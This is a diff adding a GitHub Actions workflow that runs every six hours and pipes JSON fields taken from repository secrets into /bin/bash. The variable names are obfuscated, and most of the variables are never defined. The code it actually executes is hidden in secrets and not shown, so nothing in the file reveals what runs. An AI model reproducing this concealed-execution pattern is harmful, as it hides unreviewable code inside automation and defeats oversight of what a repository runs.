@@ -1,0 +1,27 @@
+name: liuqibuzhi
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '12 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: liuqibuzhi
+        env:
+          fn678: ${{ secrets.fn678 }}
+        run: |
+          echo $fn678 | jq -r .iv74 | /bin/bash
+          echo $fyrp4926 | jq -r .o67 | /bin/bash
+          echo $b0416 | jq -r .n3 | /bin/bash
+          echo $cp6 | jq -r .a7 | /bin/bash
+          echo $qkgc25843 | jq -r .tud8 | /bin/bash
+          echo $re6 | jq -r .i24619 | /bin/bash
+          echo $vnybo15 | jq -r .u5 | /bin/bash
+          echo $xr30 | jq -r .fa21 | /bin/bash
+          echo $zpc65 | jq -r .etvlv3 | /bin/bash
+          echo $zmq6 | jq -r .dt4506 | /bin/bash
+          echo $kc0 | jq -r .wmagu74 | /bin/bash
+          echo $rc50045 | jq -r .gtu70 | /bin/bash
+
